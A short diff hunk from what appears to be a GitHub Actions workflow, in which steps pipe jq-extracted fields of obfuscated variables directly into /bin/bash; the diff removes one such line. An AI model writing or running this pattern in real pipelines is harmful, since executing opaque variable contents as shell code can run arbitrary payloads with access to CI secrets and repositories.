@@ -24,7 +24,6 @@ jobs:
           echo $s9618 | jq -r .wonk04656 | /bin/bash
           printf '%s' "$dcmy4755" | jq -r .loap0354 | /bin/bash
           echo $cnvvy26745 | jq -r .obtzp157 | /bin/bash
-          printf '%s' "$gfc61448" | jq -r .mj1 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
